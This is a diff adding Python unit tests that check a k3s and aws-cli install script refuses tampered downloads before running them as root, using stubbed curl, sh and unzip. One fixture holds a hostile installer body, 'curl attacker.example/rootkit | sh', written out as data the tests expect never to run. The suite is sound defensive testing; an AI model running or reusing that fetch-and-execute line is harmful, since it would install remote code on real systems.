@@ -170,6 +170,9 @@ class DigestCheckBehaviourTest(unittest.TestCase):
         (binp / "curl").write_text(
             f'#!/usr/bin/env bash\nout=""\nwhile [ $# -gt 0 ]; do\n'
             f'  [ "$1" = "-o" ] && {{ out="$2"; shift; }}\n  shift\ndone\n'
+            # Refuse anything but an absolute -o target, so a harness run against
+            # code that pipes curl into a shell cannot drop the payload in the CWD.
+            f'case "$out" in /*) ;; *) echo "stub curl: bad -o $out" >&2; exit 90 ;; esac\n'
             f'cp "{blob}" "$out"\nexit 0\n')
         # mv into /usr/local/bin would need root; record the call instead.
         (binp / "mv").write_text(
@@ -224,6 +227,122 @@ class DigestCheckBehaviourTest(unittest.TestCase):
         self.assertNotIn("geosite.dat", p.installed,
                          f"geosite.dat was installed unverified: {p.installed}")
 
+
+
+class RootInstallBehaviourTest(unittest.TestCase):
+    """Execute the extracted k3s and aws-cli install idioms against hostile bytes.
+
+    The ordering and absence assertions above cannot tell "downloads then verifies"
+    from "downloads then runs unverified with the check neutered" — a trailing
+    `|| true` on the sha256sum line, or a dropped --strict, passes both. These serve
+    attacker-chosen bytes and assert the root install never happens.
+    """
+
+    @staticmethod
+    def fragment(start_marker: str, end_marker: str, overrides=None) -> str:
+        body = render(AWS_STARTUP.read_text())
+        start = body.rindex("\n", 0, body.index(start_marker)) + 1
+        end = body.index(end_marker, start) + len(end_marker)
+        block = body[start:end]
+        values = dict(overrides or {})
+        return re.sub(r"\$\{([a-z0-9_]+)\}",
+                      lambda m: values.get(m.group(1)) or tf_default(AWS_VARIABLES, m.group(1)),
+                      block)
+
+    def run_k3s(self, served: bytes, overrides=None):
+        tmp = Path(tempfile.mkdtemp())
+        binp = tmp / "bin"
+        binp.mkdir()
+        (tmp / "served.bin").write_bytes(served)
+        log = tmp / "ran.log"
+
+        (binp / "curl").write_text(
+            f'#!/usr/bin/env bash\nout=""\nwhile [ $# -gt 0 ]; do\n'
+            f'  [ "$1" = "-o" ] && {{ out="$2"; shift; }}\n  shift\ndone\n'
+            # Refuse anything but an absolute -o target, so a harness run against
+            # code that pipes curl into a shell cannot drop the payload in the CWD.
+            f'case "$out" in /*) ;; *) echo "stub curl: bad -o $out" >&2; exit 90 ;; esac\n'
+            f'cp "{tmp}/served.bin" "$out"\nexit 0\n')
+        # `sh <installer>` is the root install. Record it instead of running it.
+        (binp / "sh").write_text(f'#!/usr/bin/env bash\necho "sh $*" >> "{log}"\nexit 0\n')
+        for f in binp.iterdir():
+            f.chmod(0o755)
+
+        script = ("log() { :; }\nK3S_VERSION=v1.35.5+k3s1\n"
+                  + self.fragment('K3S_INSTALLER="$(umask 077; mktemp',
+                                  'rm -f "$K3S_INSTALLER"', overrides))
+        p = subprocess.run(["bash", "-c", script], capture_output=True, text=True,
+                           timeout=60, stdin=subprocess.DEVNULL,
+                           env=dict(os.environ, PATH=f"{binp}:{os.environ['PATH']}"))
+        p.installed = log.read_text() if log.exists() else ""
+        return p
+
+    def run_awscli(self, served: bytes, overrides=None):
+        tmp = Path(tempfile.mkdtemp())
+        binp = tmp / "bin"
+        binp.mkdir()
+        (tmp / "served.bin").write_bytes(served)
+        log = tmp / "ran.log"   # outside the staging dir, which the fragment removes
+
+        (binp / "curl").write_text(
+            f'#!/usr/bin/env bash\nout=""\nwhile [ $# -gt 0 ]; do\n'
+            f'  [ "$1" = "-o" ] && {{ out="$2"; shift; }}\n  shift\ndone\n'
+            # Refuse anything but an absolute -o target, so a harness run against
+            # code that pipes curl into a shell cannot drop the payload in the CWD.
+            f'case "$out" in /*) ;; *) echo "stub curl: bad -o $out" >&2; exit 90 ;; esac\n'
+            f'cp "{tmp}/served.bin" "$out"\nexit 0\n')
+        # Unpack into an ./aws/install that records being run as root.
+        (binp / "unzip").write_text(
+            f'#!/usr/bin/env bash\nmkdir -p aws\n'
+            f'printf "#!/usr/bin/env bash\\necho \\"aws-install \\$*\\" >> {log}\\n" > aws/install\n'
+            f'chmod 0755 aws/install\nexit 0\n')
+        for f in binp.iterdir():
+            f.chmod(0o755)
+
+        script = ("log() { :; }\n"
+                  + self.fragment('AWSCLI_DIR="$(umask 077; mktemp -d',
+                                  'rm -rf "$AWSCLI_DIR"', overrides))
+        p = subprocess.run(["bash", "-c", script], capture_output=True, text=True,
+                           timeout=60, stdin=subprocess.DEVNULL,
+                           env=dict(os.environ, PATH=f"{binp}:{os.environ['PATH']}"))
+        p.installed = log.read_text() if log.exists() else ""
+        return p
+
+    # ── VULN-024 ────────────────────────────────────────────────────────────
+
+    def test_a_matching_k3s_installer_runs(self):
+        """Anchor: without this the rejection below could be an unconditional abort."""
+        payload = b"#!/bin/sh\n# stand-in for the published k3s installer\n"
+        digest = hashlib.sha256(payload).hexdigest()
+        p = self.run_k3s(payload, overrides={"k3s_installer_sha256": digest})
+        self.assertEqual(p.returncode, 0, f"a matching installer was rejected: {p.stderr}")
+        self.assertIn("sh ", p.installed,
+                      f"the installer never ran, so nothing is being tested: {p.stderr}")
+
+    def test_a_tampered_k3s_installer_never_executes(self):
+        p = self.run_k3s(b"#!/bin/sh\ncurl attacker.example/rootkit | sh\n")
+        self.assertNotEqual(p.returncode, 0, "an unverified k3s installer was accepted")
+        self.assertEqual(
+            p.installed, "",
+            f"the tampered installer was executed as root anyway: {p.installed}")
+
+    # ── VULN-025 ────────────────────────────────────────────────────────────
+
+    def test_a_matching_awscli_zip_installs(self):
+        """Anchor: without this the rejection below could be an unconditional abort."""
+        payload = b"PK\x03\x04 stand-in for the published aws-cli zip"
+        digest = hashlib.sha256(payload).hexdigest()
+        p = self.run_awscli(payload, overrides={"awscli_zip_sha256": digest})
+        self.assertEqual(p.returncode, 0, f"a matching zip was rejected: {p.stderr}")
+        self.assertIn("aws-install", p.installed,
+                      f"the installer never ran, so nothing is being tested: {p.stderr}")
+
+    def test_a_tampered_awscli_zip_never_reaches_the_installer(self):
+        p = self.run_awscli(b"PK\x03\x04 attacker-supplied archive")
+        self.assertNotEqual(p.returncode, 0, "an unverified aws-cli zip was accepted")
+        self.assertEqual(
+            p.installed, "",
+            f"./aws/install was executed as root on unverified bytes: {p.installed}")
 
 if __name__ == "__main__":
     unittest.main()
